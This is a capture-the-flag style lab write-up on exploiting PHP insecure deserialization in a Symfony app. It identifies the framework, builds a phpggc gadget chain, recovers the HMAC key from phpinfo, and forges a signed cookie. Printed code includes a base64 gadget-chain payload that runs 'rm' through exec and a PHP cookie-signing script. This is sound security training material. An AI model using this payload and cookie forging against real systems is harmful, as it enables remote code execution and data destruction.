# Lab: Exploiting PHP deserialization with a pre-built gadget chain

 This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

# Step 1 inspect session cookie

I find the following in the response:

![image](https://user-images.githubusercontent.com/83407557/213896486-d1f2a725-380b-414b-bec4-9033ff57dae2.png)

```php
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1Ym5raHM5ZTJ1ZmdlZjZjcmlkcjFxNTYydzRjYjgycyI7fQ==","sig_hmac_sha1":"57e2952755efd80f0db3d339505d0917cc5bbb70"}
```

The base64 decoded token:
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ubnkhs9e2ufgef6cridr1q562w4cb82s";}
```

# Step 2 change access token datatype

![image](https://user-images.githubusercontent.com/83407557/213896582-824c89f1-acbb-4376-8d55-5fd25137549b.png)


![image](https://user-images.githubusercontent.com/83407557/213896605-0c084612-3b34-4051-aa1c-3570e4e9ed98.png)

I get the following error, telling me the framework being used

![image](https://user-images.githubusercontent.com/83407557/213896751-33e5b7d5-81ff-42a5-b2b6-849388a8e5f7.png)


I see what payloads I can create for this framework using phpggc

![image](https://user-images.githubusercontent.com/83407557/213896787-9fd9b228-286b-488a-a524-209dc3519159.png)

# Step 3 create and send payload


I use the following to create a payload with phpggc:

![image](https://user-images.githubusercontent.com/83407557/213896905-bfbadaed-3a03-4bbb-9159-24f667580a95.png)

It doesn't work

Checking the response I see the following:

![image](https://user-images.githubusercontent.com/83407557/213896878-bf0a5f42-1017-4ada-9c93-b336122f0c6d.png)

The reason this isn't working is because the cookie isn't being signed with the correct `sig_hmac_sha1` value.

Taking a look at php documentation I find that I am going to need a key:

![image](https://user-images.githubusercontent.com/83407557/213922334-7b892c81-0396-486d-b4c8-c6ca85aea6c0.png)


# Step 4 view phpinfo()

I find the secret key in the php variables of phpinfo:

![image](https://user-images.githubusercontent.com/83407557/213922895-6a486f9e-79ca-4f4c-b486-ef048f79aa4b.png)

# Step 5 Create a key signing POC

First I want to make sure that I have a working POC to sign my own object, so I create a POC that will verify the secret key that I found is working:

```php
<?php
$object = "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1Ymlja3BmNnp4OXVlZTZhamhueTdmOGc1eXY4dGh4eSI7fQ==";
$secretKey = "vawt3my9awiamcgndd6rsj7zskv6gsur";
$cookie = '{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}';
echo $cookie;
```
I need to check and see if I run this, the `sig_hmac_sha1` is set to `dd0471ccb9ee4e9bfb7e379f35034f8c17312651`. This will tell me that I will be able to sign my own payload object:

```bash
└─$ php sign_kep.php
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1Ymlja3BmNnp4OXVlZTZhamhueTdmOGc1eXY4dGh4eSI7fQ==","sig_hmac_sha1":"dd0471ccb9ee4e9bfb7e379f35034f8c17312651"} 
```

Having found that I got the correct value I can now create my own signed cookie with the following:

```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "vawt3my9awiamcgndd6rsj7zskv6gsur";
$cookie = '{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}';
echo $cookie;
```

# Step 6 inject signed cookie object

(note I had to restart the lab because it timed out while working on the php script, so I had to get a new secret key as it seemed to reset for each lab)

I inject the cookie and have inspector handle the url-encoding:

![image](https://user-images.githubusercontent.com/83407557/213924082-f237881d-84e7-4aff-9064-38a854151b64.png)

![image](https://user-images.githubusercontent.com/83407557/213924097-9a760788-5b17-4f0b-9bf2-b4b52ad548af.png)

When the request is sent, the target file is deleted and the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/213924138-2f62ac47-0293-49e6-97e5-44e23c57bc79.png)

# Take-away

While this exploit was only possible by finding the secret leaked in PHP info, there could be other ways of gaining this secret key. For example: I have seen cases in the wild where the web app will have for example, an android app. The app can be reverse engineered which can potentially leak the secret key. Another option could be git-hub repos that leaked it in older versions.

